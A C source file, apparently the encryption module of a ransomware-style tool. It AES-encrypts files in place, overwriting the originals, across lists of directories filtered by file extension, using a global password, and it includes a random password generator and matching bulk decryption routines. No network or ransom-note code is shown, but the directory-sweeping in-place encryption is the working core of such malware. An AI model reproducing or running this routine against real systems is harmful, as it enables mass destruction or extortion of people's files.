#include "crypt.h"
#include "directory.h"
#include "file.h"
#include "aes.h"
#include "random.h"

void cr_crypt_random(unsigned char **buffer,size_t *buffer_len){
	*buffer_len=cr_random_number_256(18,32);
	cr_random_fill_with_nums_chars(*buffer_len,buffer);
}
	
size_t cr_crypt_encrypt_file_with_pass (const char *infile,
					const char *outfile,
					const void *password,
					const size_t password_len){
	unsigned char *text,
		*packed_data;
	size_t text_len,
		packed_data_len,
		err;
	
	// Fetch text to be encrypted
	err=cr_file_read_file_into_buf(infile,MAX_FILE_ENC_SIZE,&text,&text_len);
	if (err) {
		return 1;
	}

	err=cr_aes_encrypt(text,text_len,password,password_len,&packed_data,&packed_data_len);
	free(text);
	if(err){
		return 1;
	}

	// Write packed data to file
	err=cr_file_write_buf_to_file(outfile, packed_data, packed_data_len);
	free(packed_data);
	if (err) {
		return 1;
	}
	return 0;

}

size_t cr_crypt_decrypt_file_with_pass (const char *infile,
					const char *outfile,
					const char *password,
					const size_t password_len){
	unsigned char *text,
		*packed_data;
	size_t text_len,
		packed_data_len,
		pkcs7_padding,
		err;

	// Read in file contents
	err=cr_file_read_file_into_buf(infile, 0, &packed_data,&packed_data_len);
	if (err) { // any size
		return 1;
	}
	err=cr_aes_decrypt(packed_data,packed_data_len,password,password_len,
			   &text,&text_len,&pkcs7_padding);
	free(packed_data);
	if(err){
		return 1;

	}

	// Write plaintext to the output file
	err=cr_file_write_buf_to_file(outfile,text+pkcs7_padding,text_len-pkcs7_padding);
	free(text);
	if (err) {
		return 1;
	}
	return 0;
}




void cr_crypt_init(const void *password, const size_t password_len){
	cr_crypt_password=password;
	*(size_t*)&cr_crypt_password_len=password_len;
}

void cr_crypt_encrypt_file(const char* filename){
	cr_crypt_encrypt_file_with_pass(filename,filename,
					cr_crypt_password,cr_crypt_password_len);
}

void cr_crypt_decrypt_file(const char* filename){
	cr_crypt_decrypt_file_with_pass(filename,filename,
					cr_crypt_password,cr_crypt_password_len);
}

void cr_crypt_encrypt(const char *dirnames[],
		      const size_t dirnames_len,
		      const char *exts[],
		      const size_t exts_len){
	size_t i;
	for (i=0; i<dirnames_len; i++) {
		cr_directory_files(dirnames[i],exts,exts_len,cr_crypt_encrypt_file);
	}
}
void cr_crypt_dencrypt(const char *dirnames[],
		       const size_t dirnames_len){
	size_t i;
	for (i=0; i<dirnames_len; i++) {
		cr_directory_files(dirnames[i],NULL,0,cr_crypt_decrypt_file);

	}
}

void cr_crypt_print_file(const char* filename){
	printf("filename: %s\n",filename);
}
void cr_crypt_print(const char *dirnames[],
		    const size_t dirnames_len,
		    const char *exts[],
		    const size_t exts_len){
	size_t i;
	for (i=0; i<dirnames_len; i++) {
		cr_directory_files(dirnames[i],exts,exts_len,cr_crypt_print_file);
	}
}

